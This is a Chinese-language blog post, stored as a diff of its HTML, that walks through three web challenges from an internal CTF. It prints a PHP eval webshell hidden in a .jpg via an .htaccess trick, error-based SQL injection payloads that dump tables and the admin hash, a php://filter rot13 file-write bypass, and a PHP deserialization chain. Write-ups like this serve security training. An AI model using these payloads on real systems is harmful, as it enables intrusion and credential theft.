@@ -1,0 +1,708 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="xuefeng,xsnow,雪峰,ResearchManagementSystem">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.5.0">
+
+
+
+
+
+
+<meta name="description" content="总分1000，时长两小时，我只拿了250，菜">
+<meta property="og:type" content="article">
+<meta property="og:title" content="单位内部CTF-Web部分WriteUp">
+<meta property="og:url" content="https://www.xuefeng.space/2022/07/04/ProjectQingyunStageBCtfWriteupWebSection/index.html">
+<meta property="og:site_name" content="xSnow">
+<meta property="og:description" content="总分1000，时长两小时，我只拿了250，菜">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1FakeLoginPage.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1RealLoginPage.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1AdminConsole.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1ProjectManagement.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1UploadError.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1UploadHtaccess.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1AccessBackdoor.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1AntSwordConnect.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1GetFlag.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2Dashboard.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2SignUpPage.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2LoginPage.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2ChangePasswordPage.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2LoginSuccessPage.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2ChangePasswordSqlError.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2Payload1Login.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2GetTableName.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2GetColumnName.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2Payload3GetAdminPassword.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2Payload4GetAdminReversePassword.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2Xianyu1.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2Xianyu2.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2AdminLoginSuccess.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2AdminPhpSendPayload1.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2PhpinfoReturnFlag.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2AdminPhpSendPayload2.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge2AdminPhpPayload2GetFlag.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge3GetBase64OfIndexPhp.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge3IndexPhpBase64Decode.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge3WritePayload.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge3SendPayloadGetFlag.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge3Base64DecodeGetRealFlag.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/SolvedProblems.png">
+<meta property="og:image" content="https://www.xuefeng.space/images/uploads/20220704/QingyunStageBMeme.gif">
+<meta property="og:updated_time" content="2022-07-03T20:13:53.017Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="单位内部CTF-Web部分WriteUp">
+<meta name="twitter:description" content="总分1000，时长两小时，我只拿了250，菜">
+<meta name="twitter:image" content="https://www.xuefeng.space/images/uploads/20220704/Challenge1FakeLoginPage.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '雪峰'
+    }
+  };
+</script>
+
+  <title> 单位内部CTF-Web部分WriteUp | xSnow </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">xSnow</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br>
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user fa-fw"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                单位内部CTF-Web部分WriteUp
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2022-07-04T00:06:33+08:00" content="2022-07-04">
+              2022-07-04
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2022/07/04/ProjectQingyunStageBCtfWriteupWebSection/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/07/04/ProjectQingyunStageBCtfWriteupWebSection/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>总分1000，时长两小时，我只拿了250，菜</p>
+<a id="more"></a>
+<hr>
+<h2 id="0x01-Upload-50pt"><a href="#0x01-Upload-50pt" class="headerlink" title="0x01: Upload (50pt)"></a>0x01: Upload (50pt)</h2><p>时间仓促，文件上传和反序列化考试写wp只截了一些图，这里简略补充一下思路</p>
+<p><img src="/images/uploads/20220704/Challenge1FakeLoginPage.png" alt="Challenge1FakeLoginPage"></p>
+<p>假登陆页面，F12发现有hint，base64 decode得到 <code>0x0xlogin.php</code></p>
+<p><img src="/images/uploads/20220704/Challenge1RealLoginPage.png" alt="Challenge1RealLoginPage"></p>
+<p>burp爆破出弱口令admin/admin123456</p>
+<p><img src="/images/uploads/20220704/Challenge1AdminConsole.png" alt="Challenge1AdminConsole"></p>
+<p>项目管理有个上传点</p>
+<p><img src="/images/uploads/20220704/Challenge1ProjectManagement.png" alt="Challenge1ProjectManagement"></p>
+<p>文件名留空或者../../../../../../这种无法访问的路径，上传会报错，得到保存路径 <code>/upload</code></p>
+<p><img src="/images/uploads/20220704/Challenge1UploadError.png" alt="Challenge1UploadError"></p>
+<p>经过fuzz判断为后缀黑名单过滤，可以上传.htaccess，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+<p><img src="/images/uploads/20220704/Challenge1UploadHtaccess.png" alt="Challenge1UploadHtaccess"></p>
+<p>再上传jpg后缀图片马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    phpinfo();</span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'snow'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/uploads/20220704/Challenge1AccessBackdoor.png" alt="Challenge1AccessBackdoor"></p>
+<p>蚁剑连接</p>
+<p><img src="/images/uploads/20220704/Challenge1AntSwordConnect.png" alt="Challenge1AntSwordConnect"></p>
+<p>得到flag：<code>flag{063a5bda0b5a2a5d7b700d989f73902b}</code></p>
+<p><img src="/images/uploads/20220704/Challenge1GetFlag.png" alt="Challenge1GetFlag"></p>
+<hr>
+<h2 id="0x02-EasySQLi-多少分忘了"><a href="#0x02-EasySQLi-多少分忘了" class="headerlink" title="0x02: EasySQLi (多少分忘了)"></a>0x02: EasySQLi (多少分忘了)</h2><p>基于报错注入的二次注入 + 任意文件写入</p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p><img src="/images/uploads/20220704/Challenge2Dashboard.png" alt="Challenge2Dashboard"></p>
+<p>花里胡哨的仪表盘右上角有个后台登陆</p>
+<p><img src="/images/uploads/20220704/Challenge2SignUpPage.png" alt="Challenge2SignUpPage"></p>
+<p><img src="/images/uploads/20220704/Challenge2LoginPage.png" alt="Challenge2LoginPage"></p>
+<p><img src="/images/uploads/20220704/Challenge2ChangePasswordPage.png" alt="Challenge2ChangePasswordPage"></p>
+<p>提供登陆、注册、修改密码功能</p>
+<p><img src="/images/uploads/20220704/Challenge2LoginSuccessPage.png" alt="Challenge2LoginSuccessPage"></p>
+<p>根据题目提示：You need to be admin!，明确主线任务是拿到管理员权限</p>
+<p><img src="/images/uploads/20220704/Challenge2ChangePasswordSqlError.png" alt="Challenge2ChangePasswordSqlError"></p>
+<p>测试注册、登陆无论怎么输入均正常，不存在注入。注册，用户名 <code>snow&quot;</code>，修改密码报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;snow&quot;&quot; and password=&#39;d41d8cd98f00b204e9800998ecf8427e&#39;&#39; at line 1</code>，存在报错注入。Payload如下：</p>
+<ol>
+<li><p>爆表名: <code>snow&quot;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#</code><br><img src="/images/uploads/20220704/Challenge2Payload1Login.png" alt="Challenge2Payload1Login"><br><img src="/images/uploads/20220704/Challenge2GetTableName.png" alt="Challenge2GetTableName"></p>
+</li>
+<li><p>爆users字段名：<code>snow&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1)#</code><br><img src="/images/uploads/20220704/Challenge2GetColumnName.png" alt="Challenge2GetColumnName"></p>
+</li>
+<li><p>做这个题的时候已经考完一周，users表被注册了许多奇奇怪怪的用户。直接爆admin的密码：<code>snow&quot;^updatexml(1,concat(0x3a,(select(group_concat(password))from(users)where(username=&#39;admin&#39;))),1)#</code><br><img src="/images/uploads/20220704/Challenge2Payload3GetAdminPassword.png" alt="Challenge2Payload3GetAdminPassword"><br>返回XPATH syntax error: ‘:55d7642bde5ab8c0fc369e270dc4d61’</p>
+</li>
+<li><p>反过来查一下，确保password完整：<code>snow&quot;^updatexml(1,concat(0x3a,reverse((select(group_concat(password))from(users)where(username=&#39;admin&#39;)))),1)#</code><br><img src="/images/uploads/20220704/Challenge2Payload4GetAdminReversePassword.png" alt="Challenge2Payload4GetAdminReversePassword"><br>返回XPATH syntax error: ‘:816d4cd072e963cf0c8ba5edb2467d5’</p>
+</li>
+</ol>
+<p>结合 <code>55d7642bde5ab8c0fc369e270dc4d61</code> 和816d4cd072e963cf0c8ba5edb2467d5的reverse：<code>5d7642bde5ab8c0fc369e270dc4d618</code>，拼出password=<code>55d7642bde5ab8c0fc369e270dc4d618</code></p>
+<p><img src="/images/uploads/20220704/Challenge2Xianyu1.png" alt="Challenge2Xianyu1"><br><img src="/images/uploads/20220704/Challenge2Xianyu2.png" alt="Challenge2Xianyu2">  </p>
+<p>cmd5显示是付费记录，去小黄鱼花费一元请大佬帮忙解密，得到admin密码：<code>www.icbc.com.cn</code></p>
+<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><p><img src="/images/uploads/20220704/Challenge2AdminLoginSuccess.png" alt="Challenge2AdminLoginSuccess"></p>
+<p>登陆成功，来到admin.php，里面是一段PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]!=<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5($salt.$_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    <span class="comment">//flag in /fffffffffffffffffffflag</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64|zlib/i'</span>,$content))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64|zlib/i'</span>,urldecode($content)))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        file_put_contents($content,<span class="string">'&lt;?php exit();'</span>.$content);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/sandbox/<span class="number">28</span>d27f706b11f475fc39cff1a933064a</span><br></pre></td></tr></table></figure>
+<p>思路：</p>
+<ol>
+<li>URL双重编码再编码绕过两次黑名单过滤</li>
+<li>rot13绕过死亡exit()</li>
+</ol>
+<p>构造payload：</p>
+<ol>
+<li>\&lt;?php phpinfo();?&gt; -&gt; <em>ROT13</em> -&gt; \&lt;?cuc cucvasb();?&gt;</li>
+<li>r -&gt; %72 -&gt; %7%32</li>
+<li>php://filter/write=string.%7%32ot13|\&lt;?cuc cucvasb();?&gt;|/resource=snow1.php -&gt; <em>URLEncode</em> -&gt; php://filter/write=string.%257%2532ot13%7C%3C?cuc%20cucvasb();?%3E%7C/resource=snow1.php</li>
+</ol>
+<p>Get参数content传递payload：</p>
+<p><img src="/images/uploads/20220704/Challenge2AdminPhpSendPayload1.png" alt="Challenge2AdminPhpSendPayload1"></p>
+<p>根据sandbox的路径，访问生成的snow1.php</p>
+<p><img src="/images/uploads/20220704/Challenge2PhpinfoReturnFlag.png" alt="Challenge2PhpinfoReturnFlag"></p>
+<p>题目不知用了什么黑魔法，phpinfo将flag返回了</p>
+<p><img src="/images/uploads/20220704/Challenge2AdminPhpSendPayload2.png" alt="Challenge2AdminPhpSendPayload2"></p>
+<p>尝试修改payload写入一句话木马 <code>&lt;?php eval($_POST[snow]);?&gt;</code>，依旧是直接返回flag：<code>flag{e4b3b0d4681296b0cbaa5e56e584d7c1}</code></p>
+<p><img src="/images/uploads/20220704/Challenge2AdminPhpPayload2GetFlag.png" alt="Challenge2AdminPhpPayload2GetFlag"></p>
+<hr>
+<h2 id="0x03-Lesen-100pt"><a href="#0x03-Lesen-100pt" class="headerlink" title="0x03: Lesen (100pt)"></a>0x03: Lesen (100pt)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $from = $_GET[<span class="string">'from'</span>];</span><br><span class="line">    $to = $_GET[<span class="string">'to'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($from) <span class="keyword">or</span> !<span class="keyword">isset</span>($to) <span class="keyword">or</span> stripos($from, <span class="string">"flag"</span>)!=<span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $from = <span class="string">"behind.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($from);<span class="comment">// read flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($to))</span><br><span class="line">    &#123;</span><br><span class="line">        $a = unserialize($to);</span><br><span class="line">        $a-&gt;sayTheFlag();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单反序列化，文件包含过滤了flag，但我们可以先伪协议读出 <code>index.php</code> 和 <code>behind.php</code> 的base64</p>
+<p><img src="/images/uploads/20220704/Challenge3GetBase64OfIndexPhp.png" alt="Challenge3GetBase64OfIndexPhp"></p>
+<p>base64 decode还原</p>
+<p><img src="/images/uploads/20220704/Challenge3IndexPhpBase64Decode.png" alt="Challenge3IndexPhpBase64Decode"></p>
+<p>分析behind.php源码，index.php里调用sayTheFlag()，方法不存在，会自动调用<strong>call()，接着print一个对象，就会自动调用其</strong>toString()，实现最终目标file_get_contents()读flag。流程：<code>sayTheFlag()</code> -&gt; <code>Test::__call()</code> -&gt; <code>NoUse::__toString()</code> -&gt; <code>file_get_contents()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $notthis;</span><br><span class="line">            <span class="keyword">public</span> $variable;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($t1, $t2)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="keyword">$this</span>-&gt;notthis);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NoUse</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $notthis;</span><br><span class="line">            <span class="keyword">public</span> $class;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;notthis);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> Test();</span><br><span class="line">    $a-&gt;notthis = <span class="keyword">new</span> NoUse();</span><br><span class="line">    $a-&gt;notthis-&gt;notthis = <span class="string">'php://filter/read=convert.base64-encode/resource=flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(urlencode(serialize($a)));</span><br><span class="line">    <span class="comment">// print(serialize($a));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>实例化，构造反序列化链，伪协议读flag.php转换base64，最后序列化并URL编码</p>
+<p><img src="/images/uploads/20220704/Challenge3WritePayload.png" alt="Challenge3WritePayload"></p>
+<p>将生成的payload get传过去</p>
+<p><img src="/images/uploads/20220704/Challenge3SendPayloadGetFlag.png" alt="Challenge3SendPayloadGetFlag"></p>
+<p>decode还原flag.php源码，得到real flag</p>
+<p><img src="/images/uploads/20220704/Challenge3Base64DecodeGetRealFlag.png" alt="Challenge3Base64DecodeGetRealFlag"></p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>太菜了我</p>
+<p><img src="/images/uploads/20220704/SolvedProblems.png" alt="SolvedProblems"></p>
+<p>末尾40分钟竟然有勇气回去怼那Canary/PIE/NX全开的PWN题和易语言Reverse，卒</p>
+<p><img src="/images/uploads/20220704/QingyunStageBMeme.gif" alt="QingyunStageBMeme"></p>
+<blockquote>
+<p>六年过去了，博客终于迎来了一次更新✧<em>｡٩(ˊᗜˋ</em> )و✧*｡</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/05/05/XuefengCountDownTimer/" rel="next" title="桌面倒计时挂件: 距高考还有32天">
+                <i class="fa fa-chevron-left"></i> 桌面倒计时挂件: 距高考还有32天
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            索引
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            小站
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="\images\xSnow.png" alt="Xuefeng">
+          <p class="site-author-name" itemprop="name">Xuefeng</p>
+          <p class="site-description motion-element" itemprop="description">Xuefeng's Blog</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">23</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/penguin806" target="_blank" rel="external nofollow noopener noreferrer">
+                  
+                    <i class="fa fa-github"></i> GitHub
+                  
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank" rel="external nofollow noopener noreferrer">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons">
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Neighbors</p>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.anotherhome.net/" target="_blank" rel="external nofollow noopener noreferrer">Anotherhome</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://853.bronya.net/" target="_blank" rel="external nofollow noopener noreferrer">Sonic853</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.diefishfish.com/" target="_blank" rel="external nofollow noopener noreferrer">魚の筆記</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://eerie.ml/" target="_blank" rel="external nofollow noopener noreferrer">氮铀根点毫升</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://szhshp.org/" target="_blank" rel="external nofollow noopener noreferrer">Szhshp</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.ailiw.cn/" target="_blank" rel="external nofollow noopener noreferrer">听风</a>
+              </span>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Upload-50pt"><span class="nav-number">1.</span> <span class="nav-text">0x01: Upload (50pt)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-EasySQLi-多少分忘了"><span class="nav-number">2.</span> <span class="nav-text">0x02: EasySQLi (多少分忘了)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入"><span class="nav-number">2.1.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件写入"><span class="nav-number">2.2.</span> <span class="nav-text">文件写入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Lesen-100pt"><span class="nav-number">3.</span> <span class="nav-text">0x03: Lesen (100pt)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
